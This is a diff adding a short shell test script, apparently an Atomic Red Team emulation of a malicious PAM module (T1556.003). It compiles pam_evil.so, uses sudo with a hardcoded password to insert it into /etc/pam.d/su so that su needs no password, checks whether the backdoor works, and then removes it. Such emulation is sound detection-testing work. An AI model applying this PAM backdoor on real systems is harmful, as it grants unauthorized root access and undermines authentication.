@@ -1,0 +1,16 @@
+;
+#pre
+gcc -shared -fPIC -o /tmp/pam_evil.so /home/ubuntu/atomic-red-team-master/atomics/T1556.003/src/pam_evil.c
+#command
+echo "010404" | sudo -S sed -i "1s,^,auth sufficient /tmp/pam_evil.so\n,g" /etc/pam.d/su
+#check
+before=$(whoami)
+echo "before insert Malicious PAM module, whoami: $before"
+echo "su without password..."
+su
+after=$(whoami)
+echo "after insert Malicious PAM module, whoami: $after"
+if [ "$before" = "$after" ];then echo "No such file or directory";else echo "insert Malicious PAM module success";fi;
+#cleanup
+echo "010404" | sudo -S sed -i "\,auth sufficient /tmp/pam_evil.so,d" /etc/pam.d/su
+rm -f /tmp/pam_evil.so
